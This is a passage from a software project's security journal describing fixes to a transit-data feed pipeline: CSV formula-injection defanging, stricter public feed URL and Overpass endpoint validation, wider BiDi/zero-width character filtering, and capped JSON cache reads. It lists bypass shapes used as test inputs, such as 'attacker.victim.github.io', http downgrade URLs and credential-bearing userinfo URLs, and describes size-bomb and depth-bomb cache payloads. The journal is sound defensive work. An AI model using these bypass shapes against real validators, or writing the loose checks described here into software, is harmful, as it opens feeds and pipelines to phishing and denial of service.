     boundary defending against an unbounded operator-controlled
     string inflating per-row footprint, even if a future
     `extract_location_name` change drops the `_normalise_location`
     80-char clamp.
  4. **Prepend `'`** to any value beginning with one of `=`, `+`,
     `-`, `@`, `\t`, `\r`. The OWASP-recommended apostrophe is
     hidden in spreadsheet display but forces the cell to be parsed
     as text; operators reading the raw CSV still see the (defanged)
     payload, which preserves the indicator-of-compromise signal
     instead of silently dropping the attack value.

Numeric cells (`delay_minutes`) are exempt: `_format_delay` already
emits a `f"{round(float(...), 2):.2f}"` numeric string, and
re-quoting `"-5.00"` would break the dashboard aggregator's
`float(row["delay_minutes"])` parse path. The numeric-only domain
guarantees the `-` prefix is always a real number, never an
attacker-controlled formula.

**Learning:** When a writer persists data that will later be opened
in *any* spreadsheet application — Excel, LibreOffice Calc, Google
Sheets, Numbers, the GitHub web UI's CSV preview — the cell
boundary is a security perimeter equal to a published-feed URL or a
log line: every text field that flows in from upstream / cache /
directory must be neutralised, regardless of whether *any current
caller* exercises the path. The defence-in-depth contract collapses
the cartesian product of (source path × poisoning vector × future
caller × spreadsheet-app evaluator) into a single sanitiser at the
writer.

The whitespace-ordering sub-pattern carries: a defang that runs
*before* a downstream `.strip()` (or that runs `.strip()` *before*
the formula-prefix check) leaves a leading-whitespace evasion live.
The only ordering that closes the cartesian product of (leading
TAB / leading CR / leading space / inner formula-prefix-after-
whitespace) is *strip-then-prefix-check*, performed inside the
sanitiser so no caller can re-introduce the gap by doing its own
strip before sanitising. The `or "unbekannt"` fallback must follow
the sanitiser, not precede it, otherwise a payload that sanitises
to empty string (e.g. all control bytes) would leak the empty
string before the fallback runs.

The numeric-vs-text domain split also carries: `_format_delay`'s
guarantee that `delay_minutes` always renders as a numeric string
makes the `-` prefix safe (every `-N.NN` is a real number, not a
formula). Sanitising it would *break* the dashboard's `float(...)`
re-parse and create a worse cascade than the threat. Mark every
non-text cell explicitly with the typed-format guarantee that
licenses its bypass.

**Prevention:** Every new public CSV / TSV / spreadsheet-bound
writer must apply `_sanitize_csv_text_field` (or a sibling
sanitiser) to every text field at the writer boundary, with the
strip-then-prefix-check ordering pinned inside the sanitiser. Grep
for `csv.writer\|csv.DictWriter\|writerow\(\|writerows\(` across
`src/` and `scripts/` and verify each text field flows through a
formula-prefix defang. Markdown rendering of the same fields
(`scripts/generate_markdown_stats.py:585,600,511` — Markdown table
cells `f"| {direction} | {count} |"` interpolate the *same*
upstream-influenced strings without escaping `|` / `*` / `` ` `` /
`<` / `>` / `[`) is a sibling drift candidate flagged here for the
next round: defanging at the CSV write does NOT cover the
markdown-injection axis when the same data is re-rendered into
`docs/statistik.md`. Future audits should also look at any
`json.dump`-style writer whose output is later opened in a
*spreadsheet importer* (CSV import wizards in Excel happily evaluate
a JSON-then-CSV-converted cell) and, more broadly, every on-disk
serialiser whose downstream consumer set includes a tool that
evaluates leading `=` / `+` / `-` / `@` / `\t` / `\r` as a formula.

## 2026-05-09 - Public Feed URL Allow-List Drift: HTTP-Scheme Acceptance + `.github.io` Sub-Subdomain Wildcard + Empty / Dash-Prefixed Subdomain (Allow-List Drift Round, Validator Boundary)
**Vulnerability:** `validate_public_feed_url`
(`src/utils/http.py:1241-1261`, pre-fix) — the validator that pins
every URL flowing into the published RSS feed (`<channel><link>`,
per-item `<link>` fallback, atom `self`/`alternate` hrefs) and the
GitHub Pages sitemap (`<urlset><url><loc>`) — accepted three orthogonal
sub-vectors that the previous round's "Allow-List Pattern: prefer
byte-exact equality at structural boundaries" learning explicitly
flagged as the next drift candidate.  The validator delegated to
`validate_http_url` for SSRF / control-character / port checks and
then layered a host allow-list on top:

  ```python
  _PUBLIC_FEED_URL_TRUSTED_HOSTS = frozenset({"github.com"})
  _PUBLIC_FEED_URL_TRUSTED_SUFFIXES = (".github.io",)
  ...
  if host in _PUBLIC_FEED_URL_TRUSTED_HOSTS:
      return safe
  if any(host.endswith(suffix) for suffix in
         _PUBLIC_FEED_URL_TRUSTED_SUFFIXES):
      return safe
  ```

That shape mapped exactly onto the three sub-vector axes the prior
journal entry warned about — scheme-strictness, prefix-shape, and
empty-label drift — and reproduced 12 distinct exploit shapes when
exercised:

  (a) **TLS-strip / HTTP downgrade (5 shapes)** — `validate_http_url`
      accepts both `http` and `https` schemes by default.  The
      public-feed pin did not constrain scheme, so every `http://`
      variant of the trusted hosts (`http://github.com/...`,
      `http://example.github.io/...`, etc.) passed.  An env override
      (`FEED_LINK=http://...` / `PAGES_BASE_URL=http://...` /
      `SITE_BASE_URL=http://...` via leaked CI env, compromised secret
      store, intentional misconfig) lands a plaintext URL inside the
      published RSS feed `<link>`, atom `self`/`alternate` hrefs, and
      `sitemap.xml` `<loc>` elements.  Every subscriber's RSS reader
      fetches the link as-written; many do not consult HSTS preload
      lists (which `*.github.io` is on for browsers but not for most
      RSS clients).  A MITM (corporate gateway, hostile ISP, public
      WiFi, captive portal, ARP-spoofed LAN) downgrades the request,
      replaces the published artefact contents — turning the entire
      cron pipeline's published output into an attacker-controlled
      phishing/SEO redirect amplifier on every subscriber.
  (b) **Sub-subdomain wildcard (4 shapes)** — `host.endswith(".github.io")`
      matches any number of labels before `.github.io` (e.g.
      `a.b.github.io`, `attacker.victim.github.io`,
      `nested.deep.example.github.io`).  Real GitHub Pages targets
      are always `<single-owner>.github.io` (or
      `<single-owner>.github.io/<repo>`); sub-subdomain shapes are
      not Pages targets.  An attacker who flips an env override to
      `attacker.victim.github.io/wien-oepnv` lends visual credibility
      to a phishing destination — the `victim.github.io` substring
      reads as the canonical project to a casual reader, and the
      published feed item's `<link>` element carries the deception
      verbatim into every subscriber's UI.
  (c) **Empty / dash-prefixed subdomain (3 shapes)** —
      `urlparse("https://.github.io/foo").hostname` returns the
      RFC-invalid hostname `.github.io`, and
      `".github.io".endswith(".github.io")` is True, so the validator
      accepted a literal `.github.io` hostname.  Same shape applies to
      `-bad.github.io` and `-.github.io`: GitHub usernames / org names
      cannot start with a dash (RFC-1123 label rules plus GitHub's
      stricter handle rules), so a leading-dash subdomain is not a
      real Pages target.  The empty-prefix shape additionally
      provides a malformed-URL primitive that some downstream
      consumers render verbatim while others normalise — a divergent
      rendering surface that complicates incident triage.

Threat model: today the only consumers of `validate_public_feed_url`
(`src/feed/config.py:_validated_feed_public_url`,
`scripts/generate_sitemap.py:_is_valid_base_url`) call the validator
with operator-supplied env overrides.  An attacker who lands an
`http://`-scheme override, a sub-subdomain owner-impersonation
override, or an empty-subdomain override poisons every published
artefact for every subscriber and search-engine crawler.  The host
pin is the LAST gate before the URL flows into RSS / sitemap / atom
output; tightening the pin to byte-strict scheme + label shape
matches the journal-pinned `OSMOverpassConfig` strict-equality
pattern (Two-Site Drift Closure entry below) and collapses the
cartesian product of sub-components into a single decision.

**Fix:** Three reinforcing tightenings layered onto the existing host
allow-list, packaged into a single PR:

  (i)   **Force HTTPS scheme** — after delegating to
        `validate_http_url`, parse the safe URL and reject any URL
        whose `parsed.scheme.lower() != "https"`.  The validator is
        for URLs that land in *publicly-served* artefacts; HTTP is
        never legitimate at this boundary.
  (ii)  **Single non-empty alphanumeric-prefix label** — replace
        `host.endswith(suffix)` with a two-stage check: confirm the
        suffix match, then strip the suffix and verify the remaining
        prefix matches `^[a-z0-9][a-z0-9-]{0,62}$`
        (`_PUBLIC_FEED_URL_GITHUB_PAGES_OWNER_RE`).  Pinned tighter
        than RFC because GitHub usernames cannot start with a dash;
        max length 63 follows the RFC-1123 label limit.  The
        hostname is already lowercased by `urlparse`/NFKC
        normalisation in `validate_http_url` before this regex is
        consulted, so `re.IGNORECASE` is intentionally NOT used.
  (iii) **Documentation pin** — the module-level comment block at
        `_PUBLIC_FEED_URL_TRUSTED_HOSTS` now spells out the three
        sub-vectors the validator closes (scheme, prefix shape,
        empty label) so a future contributor who relaxes any of
        them has a written-down record of the threat model rather
        than relying on the `_PUBLIC_FEED_URL_TRUSTED_*` constant
        names alone.

**Test surface:** **+25 new pytest cases** in
`tests/test_sentinel_public_feed_url_drift.py`:
  * 7 cases pinning the canonical-URL regression
    (`test_canonical_https_urls_still_accepted`) — every accepted
    shape that landed in the pre-existing test suite plus three
    new HTTPS-Pages variants (trailing slash, no trailing slash,
    no path).
  * 5 cases pinning HTTP-scheme rejection
    (`test_http_scheme_rejected`) — every trusted host's `http://`
    variant.
  * 4 cases pinning sub-subdomain rejection
    (`test_sub_subdomain_rejected`) — 2-, 3-, and 4-label prefixes
    plus an attacker-impersonation shape.
  * 3 cases pinning malformed-label rejection
    (`test_invalid_label_shape_rejected`) — empty subdomain,
    leading-dash subdomain, and just-a-dash subdomain.
  * 6 cases pinning the pre-existing rejection contract
    (`test_pre_existing_rejection_contract_preserved`) — every URL
    in `test_feed_public_url_host_pinning.py`'s parametrize list
    continues to be rejected post-fix.  Mirrors the
    "regression-floor" pattern from
    `test_sentinel_overpass_endpoint_strict_validation.py`.
  Pre-fix the 12 sub-vector cases all failed (verified before
  applying the fix); post-fix all 25 cases pass alongside the 11
  pre-existing cases in
  `test_feed_public_url_host_pinning.py`.

**Threat-model deltas:**
  * **TLS-strip blast radius**: pre-fix every subscriber's RSS reader
    fetched the published `<link>` over HTTP (if env override pointed
    HTTP), exposing the artefact contents to MITM substitution at
    every network hop.  Post-fix: HTTPS-only, MITM is constrained to
    TLS-protocol attacks (which are out-of-scope for this validator
    — they are mitigated at the TLS / certificate-pinning layer).
  * **Phishing-impersonation surface**: pre-fix
    `attacker.victim.github.io` (any 2-label-or-deeper prefix) was
    accepted as a "trusted GitHub host"; post-fix only
    `<owner>.github.io` (single label matching the GitHub username
    regex) is accepted, collapsing the impersonation surface from
    "any sub-subdomain owner" to "any GitHub Pages owner" — an
    attacker still needs to register a GitHub account, but cannot
    leverage a victim's owned subdomain to lend credibility.
  * **Malformed-URL surface**: pre-fix the validator accepted
    RFC-invalid hostnames (`.github.io`, `-bad.github.io`); post-fix
    the validator's output is always RFC-valid, eliminating a class
    of divergent-rendering-surface bugs that could complicate
    incident triage.

**Learning:** The recursive meta-pattern — every time a defence
walker / validator accepts a "wildcard match" against a structural
component (TLD suffix, hostname suffix, scheme prefix, path prefix),
the wildcard edge cases (empty prefix, multi-label prefix, dash-
prefixed prefix) become the next drift surface.  Three reinforcing
rules:

  (a) **Wildcard-suffix audit rule.** Whenever a validator uses
      `host.endswith(suffix)` (or any string-suffix wildcard), the
      audit floor MUST verify the *prefix* shape, not just the
      suffix match.  Concretely: `_PUBLIC_FEED_URL_GITHUB_PAGES_OWNER_RE`
      pins a single-label allow-list shape; sibling validators that
      use `endswith(".something")` MUST be retroactively audited for
      the same drift.  Sibling candidates: `_UNSAFE_DOMAINS` in
      `src/utils/http.py` (uses `endswith("." + unsafe_domain)` for
      blocklist matching — this is the *opposite* polarity, so the
      empty-prefix shape is favourable here, not adversarial; but
      the multi-label prefix shape may still over-match), and any
      future provider URL pin that uses TLD-suffix wildcarding.

  (b) **Scheme-strictness rule for published-artefact validators.**
      Every validator whose output flows into a publicly-served
      artefact (RSS feed link, sitemap loc, atom href, OpenGraph
      meta tag, etc.) MUST pin the scheme to `https` at the
      validator boundary, not at the consumer boundary.  The
      consumer-boundary pattern fails open if a future consumer
      forgets the pin; the validator-boundary pattern is
      structural and inherits to every consumer automatically.
      Sibling candidates: any future `validate_atom_*` /
      `validate_sitemap_*` helper, and the read-side of
      `_validated_feed_public_url` (currently scheme-agnostic for
      the env override fallback path).

  (c) **Documentation pin for cartesian-product wildcards.** When
      a validator accepts a wildcard against any structural axis
      (host suffix, scheme prefix, path prefix), the module-level
      docstring / comment MUST enumerate every other axis the
      wildcard *does not* constrain — explicitly stating "this
      validator does NOT constrain X / Y / Z" forces a future
      contributor relaxing the wildcard to confront the entire
      cartesian product instead of only the axis they were
      originally tightening.  The pre-fix comment said
      "validate_http_url only checks SSRF/DNS-rebinding properties,
      not host identity"; the post-fix comment additionally
      enumerates "scheme strictness" and "prefix shape" so the
      next drift surface is named explicitly.

**Prevention:** The
`tests/test_sentinel_public_feed_url_drift.py` parametrize lists
form the regression floor.  A future relaxation of any of the three
sub-vector axes would require either deleting cases from the
parametrize list or weakening the assertion — both of which fail
loud in PR review.  Mirrors the
`test_sentinel_overpass_endpoint_strict_validation.py` pattern from
the Two-Site Drift Closure entry below.

## 2026-05-09 - Two-Site Drift Closure: OSMOverpassConfig Host-Only Validation + `_UNSAFE_CHARS_RE` BiDi/Zero-Width Gap (BiDi-Mark Drift Round 3 + Allow-List Drift)
**Vulnerability:** Two structural defence-in-depth gaps closed in a
single PR.

(1) **`OSMOverpassConfig.__post_init__` host-only validation** —
`src/places/osm_client.py:203-206` (pre-fix) extracted
`urlparse(self.endpoint).hostname` and checked membership in
`_TRUSTED_OVERPASS_HOSTS` (a frozenset built from
`DEFAULT_OVERPASS_ENDPOINTS` hostnames). The check accepted *any* URL
whose hostname matched, regardless of scheme, port, path, or
userinfo. Three orthogonal sub-vectors fall out:
  (a) **TLS-strip** — `http://overpass-api.de/api/interpreter`
      passes the host-only check; `validate_http_url` (called inside
      `request_safe`) accepts `http://` by default, so a future
      caller bypassing `get_overpass_endpoint()` would route the
      cron pipeline's outbound request over plaintext. A MITM
      (corporate gateway, hostile ISP, public WiFi) injects a
      malicious station payload that flows verbatim into
      `stations.json` and the published feed.
  (b) **Path / endpoint hijack** —
      `https://overpass-api.de/api/admin` or any other path on the
      same host passes the host-only check. The Overpass operator
      runs other paths on the same host; a future config-file /
      CLI consumer of `OSMOverpassConfig` could redirect the cron
      pipeline to an unrelated endpoint without tripping any guard.
  (c) **Port / userinfo hijack** —
      `https://overpass-api.de:8443/api/interpreter` and
      `https://attacker:secret@overpass-api.de/api/interpreter`
      both pass. `validate_http_url` rejects non-default ports at
      request time so (c) is partially mitigated, but a future code
      path bypassing `validate_http_url` (debug client, websocket
      upgrade, raw urllib3 access) inherits the loose validator.
      The userinfo variant additionally leaks credentials into log
      lines that print the full `self.endpoint` string.

The journal pattern across every prior allow-list-drift round is
exactly this: the boundary that was strict on day one drifted into a
host-only check after some refactor, and a future caller landed on
the loose internal validator instead of the strict resolver. Every
current caller routes through `get_overpass_endpoint()` (which IS
strict — exact-match against `DEFAULT_OVERPASS_ENDPOINTS`), so the
gap is defence-in-depth today, but the drift surface is permanent
once a future contributor instantiates `OSMOverpassConfig` from a
CLI flag, a config file, a leaked env var, or a unit-test fixture
that bypasses the env resolver.

(2) **`_UNSAFE_CHARS_RE` BiDi/Zero-Width gap** —
`src/utils/stations_validation.py:542` (pre-fix) carried a
character class `[<>\x00-\x08\x0b\x0c\x0e-\x1f -‮⁦-⁩]`
that covers ASCII C0 controls (minus `\t`/`\n`/`\r`), the
line/paragraph-separator + LRE/RLE/PDF/LRO/RLO BiDi family, and the
LRI/RLI/FSI/PDI BiDi-isolate family. The 2026-05-09 BiDi-Mark Drift
Round 2 entry below explicitly named this regex as the next drift
candidate: it was narrower than the canonical
`src/utils/logging.py:_INVISIBLE_DANGEROUS_RE` along seven code points:
  * `؜` ARABIC LETTER MARK (ALM)
  * `​-‏` ZWSP / ZWNJ / ZWJ / **LRM** / **RLM**
  * `﻿` BYTE ORDER MARK (BOM)

A planted `stations.json` (poisoned PR / compromised CI runner /
partial flush + power loss / parallel orchestrator atomic state
swap mid-write) carrying any of these code points in `name`,
`bst_code`, `vor_id`, or `aliases` slipped past
`_find_security_issues` and flowed verbatim into:
  * the published RSS feed item titles (Trojan-Source rendering
    in feed readers — same primitive as CVE-2021-42574 but missing
    from every prior round of this regex);
  * operator-facing log lines (post-`SafeFormatter` text is
    sanitised at format time, but pre-sanitisation flow into
    `caplog.text` and non-default handlers leaks);
  * downstream SIEM ingestion (forge a second log record carrying
    a fake `level=ERROR` via Unicode line terminators).

The companion regex `_INVISIBLE_DANGEROUS_RE` already covers the
full union as of Round 2's `strip_control_chars=False` sibling-path
extension; the validator boundary is the last divergent surface.

**Fix:**
  (1) Tighten `OSMOverpassConfig.__post_init__` to require
      **byte-exact match** against `DEFAULT_OVERPASS_ENDPOINTS` —
      mirrors the contract enforced by `get_overpass_endpoint()` for
      the env-driven path. A single `if self.endpoint not in
      DEFAULT_OVERPASS_ENDPOINTS: raise ValueError(...)` collapses
      every host-only sub-vector (a)/(b)/(c) into a single rejection.
      `_TRUSTED_OVERPASS_HOSTS` is preserved as a documentation
      constant; it is no longer the validation gate.
  (2) Widen `_UNSAFE_CHARS_RE` to the union of the legacy
      structural-injection set AND the canonical
      `_INVISIBLE_DANGEROUS_RE` set:
      `[<>\x00-\x08\x0b\x0c\x0e-\x1f؜​-‏ -‮⁦-⁩﻿]`.
      The two regexes now stay in sync via the new inventory test
      `test_unsafe_chars_regex_covers_canonical_invisible_dangerous_set`
      which fails any future regression that narrows the validator
      regex or widens `_INVISIBLE_DANGEROUS_RE` without a matching
      validator update.

**Test surface:** **+31 new pytest cases**:
  * `tests/test_sentinel_overpass_endpoint_strict_validation.py` —
    7 cases: canonical-endpoint regression + 5 sub-vector PoCs
    (HTTP downgrade, path hijack, port hijack, trailing slash,
    userinfo) + unrelated-host regression.
  * `tests/test_sentinel_stations_validation_bidi_gap.py` — 24
    cases: per-code-point regex match (7 cases × ALM / ZWSP / ZWNJ
    / ZWJ / LRM / RLM / BOM), per-code-point end-to-end name flag
    (7 cases), per-code-point end-to-end alias flag (7 cases),
    inventory invariant covering the canonical
    `_INVISIBLE_DANGEROUS_RE` set, existing-coverage regression,
    and safe-character regression.

**Learning:** Two reinforcing lessons:

  (a) **Allow-list pattern: prefer byte-exact equality at structural
      boundaries.** Every layer of the cron pipeline that consumes
      a URL eventually parses + normalises it; if any of those
      layers extracts a sub-component (hostname, path, port, scheme)
      and validates only that sub-component, an attacker exploiting
      the *other* sub-components of the URL is unconstrained at
      that layer. The strict shape — byte-exact equality against a
      const tuple — collapses the whole cartesian product of
      sub-components into a single decision and cannot drift via
      `urlparse`-quirk bypasses (e.g. Unicode normalisation,
      trailing-dot host, percent-encoded path). Apply the same
      rule to every structural boundary that internalises an
      operator-controlled URL: `OSMOverpassConfig.endpoint`,
      `OEBB_GTFS_RT_URL` (rolled back, but the lesson stands), any
      future `provider.endpoint` field. Sibling drift candidates:
      `validate_public_feed_url` (`src/utils/http.py`) currently
      accepts a host allow-list with a TLD-suffix wildcard
      (`.github.io`); audit whether that wildcard is byte-exact at
      every consumer or if any caller has drifted into a host-only
      sub-component check.

  (b) **Companion-regex sync rule.** Whenever a defence regex grows
      to cover a new code point, audit every sibling regex in the
      project (`stations_validation._UNSAFE_CHARS_RE`,
      `_UNSAFE_URL_CHARS` in `http.py`, station-name validators in
      provider modules) and either widen them to match or document
      the divergence with an explicit deferral note. The Round 2
      entry below noted the validator's deferral was deliberate
      (structural-validation scope, not log-sanitisation scope) but
      flagged it as the next drift candidate; this round closes
      that drift. The inventory test
      `test_unsafe_chars_regex_covers_canonical_invisible_dangerous_set`
      pins the invariant programmatically — if a future round
      widens `_INVISIBLE_DANGEROUS_RE` to cover (e.g.) a new
      Unicode 16 BiDi format control, the sync test fails until
      the validator is widened too. This converts the "deliberate
      deferral" pattern from a journal-narrative defence into a
      programmatic audit floor that survives the next contributor
      who hasn't read the journals.

## 2026-05-09 - JSON Size-Bomb Drift Round 8: Stammstrecke Cron Monitor Reads Its Own Cache With Bare `_json_lib.load(fh)` (Aliased-Import Bypass Of The Audit Walker)
**Vulnerability:** PR #1365 (`0520e0d`, *feat: add S-Bahn Stammstrecke
median-delay monitor*) plus the four follow-up PRs that iterated on the
feature — #1366 (split-by-direction + 10/h breaker), #1367 (HTTP timeout +
station-name resolution), #1368 (`first_seen` persistence + self-healing
cache), #1369 (`max_journeys=5` tune-up) — wired the new
`scripts/update_stammstrecke_status.py:_read_existing_first_seen`
helper to read its own previous-tick cache via a bare
`with OUTPUT_PATH.open("r", ...) as fh: data = _json_lib.load(fh)`
shape (line 426 pre-fix). Three orthogonal defences were missing
relative to the canonical `read_capped_json` contract pinned by JSON
Size-Bomb Round 1-7:
1. **No size cap** — the canonical 50 MiB
   `DEFAULT_MAX_JSON_FILE_BYTES` defence-in-depth was unreachable
   because the call site never routed through `read_capped_json` at
   all. A planted-huge `cache/stammstrecke/events.json` (compromised
   CI runner / partial flush + power loss / corrupted previous run /
   parallel orchestrator process performing an atomic state swap
   mid-read) buffered into memory via bare `_json_lib.load(fh)`
   allocates O(file_size) bytes plus a multiplier of object overhead,
   exhausts the runner's cgroup memory limit, and propagates
   `MemoryError` (a `BaseException` subclass NOT caught by
   `except (OSError, _json_lib.JSONDecodeError, UnicodeDecodeError)`)
   past the loader to crash the cron pipeline. **Worse, a crash before
   `_write_cache` skips the unconditional self-heal write**, so the
   corruption persists indefinitely — every subsequent cron tick
   re-tries and re-crashes, permanently disabling the monitor with no
   self-recovery path. The only manual recovery is operator
   intervention to truncate the cache file.
2. **No TOCTOU defence** — between `OUTPUT_PATH.exists()` and
   `OUTPUT_PATH.open("r", ...)` an attacker who can `os.replace` the
   inode (the same TOCTOU primitive documented in the
   `read_capped_json` docstring at `src/utils/files.py:224-233`)
   bypasses the `.exists()` check by swapping a small placeholder for
   a huge planted target between the two syscalls.
3. **No `RecursionError` catch** — a 5000-deep nested-array document
   is a few KB on the wire / disk but propagates `RecursionError`
   (a `RuntimeError → Exception` subclass — NOT a
   `JSONDecodeError` and NOT an `OSError`) past every
   `except (OSError, JSONDecodeError, UnicodeDecodeError)` handler.
   The same drift family that JSON Depth-Bomb Round 1-5 closed across
   33 sites by walking every `json.loads` / `json.load` /
   `response.json()` site for `RecursionError`-tolerant exception
   coverage.

**Walker-drift compounding:** The
`tests/test_sentinel_json_audit_walker.py:test_every_json_parser_site_catches_recursion_error`
walker — added in Round 5 specifically to catch this class of drift —
*missed the call site entirely*. The walker's `_is_json_parser_call`
predicate matched `<X>.load(...)` only when
`func.value.id == "json"`, but the script used
`import json as _json_lib; _json_lib.load(fh)`. Local name
`_json_lib` did not match the literal `"json"` string, so the walker
silently skipped the bare-load shape on every run since PR #1365
shipped. The walker's defence floor was scoped narrower than its
coverage claim: it only enforced the canonical-name parser shape, not
the canonical-module shape.

**Per-preserved-field gap:** Even with the file-level cap, individual
field strings (`_identity`, `first_seen`) inside a sub-cap-but-large-
field cache document were accepted into the returned map without any
length / control-character / ISO-shape validation. The pre-fix path
was a bare `isinstance(value, str)` gate. A 100 KiB `first_seen`
string under the file cap was accepted, propagated to
`_resolve_first_seen`, and logged via `sanitize_log_arg(prev_iso)` —
amplifying log-line size without bound. Mirrors the per-field gap
documented in the (rolled-back) GTFS-RT entry — which had the same
write-side preservation contract and the same per-field shape
ambiguity that the per-channel sanitiser couldn't compensate for.

**Exploit shape:** A threat actor with one-time write access to
`cache/stammstrecke/events.json` (any of: compromised CI runner;
partial flush + power loss mid-`atomic_write`; corrupted previous
run; parallel orchestrator process performing an atomic state swap;
git history rewrite that lands a poisoned cache via PR) plants:
  (a) a multi-MiB JSON document — pre-fix `MemoryError` crashes the
      next cron tick, skips `_write_cache([])`, persists indefinitely;
  (b) a sub-cap document with a 100 KiB `first_seen` string — pre-fix
      flows into `_resolve_first_seen`, logs a sanitised but
      unbounded warning line on every cron tick;
  (c) a 5000-deep nested-array document — pre-fix `RecursionError`
      escapes the catch tuple, identical crash shape to (a);
  (d) a sub-cap document with `\x00`/`\x07`/`\x1f` bytes in
      `first_seen` or `_identity` — pre-fix accepted, propagated into
      the build_feed pipeline (the canonical reader at
      `src/build_feed.py:read_cache_stammstrecke` and
      `src/feed/providers.py:read_cache_stammstrecke` both forward
      the entire payload to `deduplicate_fuzzy` / feed item
      construction without a per-channel `_sanitize_text` filter on
      the `_identity` axis).

**Fix:** Five reinforcing changes, packaged into a single PR:
  (i) **Per-loader byte cap** — new `MAX_STAMMSTRECKE_CACHE_BYTES =
      256 * 1024` constant in `src/feed/providers.py` (sized at ~128x
      the largest legitimate state shape ~2 KiB; ~50,000x tighter
      than the canonical 50 MiB default). Mirrors the per-loader cap
      pattern from JSON Size-Bomb Round 1-7
      (`MAX_CACHE_FILE_BYTES`, `MAX_QUOTA_FILE_BYTES`,
      `MAX_TILE_FILE_BYTES`, etc.).
  (ii) **Tightened canonical readers** — both
       `src/build_feed.py:read_cache_stammstrecke` and
       `src/feed/providers.py:read_cache_stammstrecke` now pass
       `max_bytes=MAX_STAMMSTRECKE_CACHE_BYTES` explicitly to
       `read_capped_json`. The structural pin
       (`test_providers_reader_passes_explicit_max_bytes`) patches
       `read_capped_json` and asserts the call kwargs — a future
       refactor that removes the explicit keyword fails the test
       before the change can land.
  (iii) **Replaced bare `_json_lib.load(fh)` with `read_capped_json`**
        — the script's `_read_existing_first_seen` now routes through
        `read_capped_json(OUTPUT_PATH, max_bytes=
        MAX_STAMMSTRECKE_CACHE_BYTES, label="Stammstrecke",
        logger=LOGGER)`. The replacement closes the size-cap, TOCTOU,
        `RecursionError`, and `UnicodeDecodeError` gaps in one cut.
  (iv) **Per-preserved-field shape validators** — new
       `_is_valid_preserved_first_seen(value: object) -> TypeGuard[str]`
       and `_is_valid_preserved_identity(value: object) -> TypeGuard[str]`
       module-level helpers in
       `scripts/update_stammstrecke_status.py`. Each validates
       (a) `isinstance(value, str)` (TypeGuard narrows for mypy
       strict), (b) non-empty after strip, (c) length ≤ per-field cap
       (`_MAX_PRESERVED_FIRST_SEEN_LENGTH = 64`,
       `_MAX_PRESERVED_IDENTITY_LENGTH = 256`), (d) no XML 1.0
       control characters via `_PRESERVED_CONTROL_CHAR_RE`, and (for
       `first_seen` only) (e) parseable via
       `datetime.fromisoformat`. The reader now skips items that
       fail either validator; pre-fix items with a 100 KiB
       `first_seen` were accepted into the returned map.
  (v) **Audit-walker alias resolution** — the canonical
      walker at
      `tests/test_sentinel_json_audit_walker.py:_is_json_parser_call`
      now consumes a `json_aliases: set[str]` parameter populated by
      a new `_collect_json_module_aliases(tree)` helper that walks
      every `import json as <alias>` binding in the module under
      audit. The walker now flags
      `<alias>.load(...)` / `<alias>.loads(...)` for any
      alias, not just the literal `"json"` name. Closes the
      walker-drift axis that let this round's vulnerability slip
      through every CI run since PR #1365.

**Test surface:** **+15 new pytest cases** across three touched
modules:
  * `tests/scripts/test_update_stammstrecke_status.py` — +12 cases
    (5 PoCs against the vulnerable shapes plus 7 contract pins for
    the per-field validators and the imported constant).
  * `tests/test_sentinel_stammstrecke_cache_cap.py` (new) — +4 cases
    pinning the canonical reader contract: cap value, oversized-file
    rejection, legitimate-file round-trip, and the structural
    `read_capped_json(max_bytes=...)` keyword pin.
  * `tests/test_sentinel_json_audit_walker.py` — +2 cases pinning
    the alias-resolution walker extension
    (`test_walker_recognises_aliased_json_module`,
    `test_collect_json_module_aliases_includes_canonical_and_aliased`).

**Threat-model deltas:**
  * **Size-bomb amplification window**: pre-fix 50,000x (50 MiB
    canonical default ÷ ~1 KiB legitimate state); post-fix ~128x
    (256 KiB per-loader cap ÷ ~2 KiB legitimate state). Mirrors the
    GTFS-RT cap shape from the rolled-back entry.
  * **Self-heal contract**: pre-fix a `MemoryError` raised before
    `_write_cache([])` left the cron permanently disabled; post-fix
    `read_capped_json` returns `None` on oversized input, the loader
    returns `{}`, the rest of `main()` runs to completion, and
    `_write_cache([])` overwrites the corrupted file via
    `atomic_write`'s `os.replace` rename — fully self-healing on the
    next cron tick (worst-case 30 minutes).
  * **Per-channel sanitisation continuity**: the per-field validators
    enforce the same XML 1.0 control-character set as
    `src/build_feed.py:_CONTROL_RE` (the canonical
    `_sanitize_text` filter), so `_identity` strings that bypass
    the build-side `_sanitize_text` filter (because `_identity`
    is a structural key, not a rendered text channel) inherit the
    same defence floor at the read boundary.
  * **Audit-walker coverage floor**: pre-fix the walker covered
    only `import json` (canonical-name) bindings; post-fix the walker
    resolves every `import json as <alias>` binding via AST
    inspection. The walker's coverage claim now matches its actual
    behaviour — the docstring assertion *"every json.load[s] /
    response.json() call"* was technically false pre-fix because the
    canonical-name predicate excluded aliased imports. The smoke
    tests (`test_walker_recognises_aliased_json_module`) pin the
    invariant.

**Learning:** The recursive meta-pattern is identical to every prior
round in the JSON size-bomb / depth-bomb / clear-text-logging /
cache-driven-provider families — *a defensive walker that closes one
structural axis surfaces a sibling axis the walker didn't include
catches*. Round 5's walker assumed `"json"` was the canonical
module-binding name; that assumption held for every site Round 5
audited but failed for the ONE site PR #1365 added with an aliased
import. The right structural verdict for an "auto-discoverable
invariant" walker is now: **the walker's predicate must resolve
every binding shape the language allows, not just the canonical
name** — `import X` (canonical), `import X as <alias>` (aliased),
`from X import Y` (callable), `from X import Y as <alias>` (aliased
callable). Concretely: every existing audit walker in the project
(`test_sentinel_clear_text_logging_drift_utils`,
`test_sentinel_json_audit_walker`,
`test_sentinel_secret_scanner_drift`, etc.) MUST be retroactively
audited for the same alias-bypass shape. The companion entry below
(BiDi-Mark Drift Round 2) makes the parallel point for sanitiser
walkers — sibling helpers that flip the flag in the OPPOSITE
direction bypass the regex entirely.

**Prevention:** Three reinforcing rules:
  (a) **Aliased-import resolution rule for parser-coverage walkers**:
      every walker that pattern-matches `<X>.<method>(...)` calls
      against a stdlib module name MUST resolve aliased imports via
      AST inspection of the module under audit. The minimum shape:
      `_collect_<module>_aliases(tree) -> set[str]` walks every
      `import <module> [as <alias>]` binding and returns the set
      of local names; the predicate then checks `func.value.id in
      aliases` instead of the literal canonical name. Mirrors the
      per-channel-sanitiser audit-floor pattern (BiDi-Mark Round 2)
      where the walker enumerated every flag-direction sibling.
  (b) **Per-loader cap rule for cache-driven providers** (already
      pinned for JSON Size-Bomb Round 1-7; renewed here): every
      cache-driven provider MUST expose its own
      `MAX_<NAME>_CACHE_BYTES` constant sized at 100x-1000x the
      largest legitimate state shape, and pass it explicitly to
      `read_capped_json` at every read site (writer-self-read AND
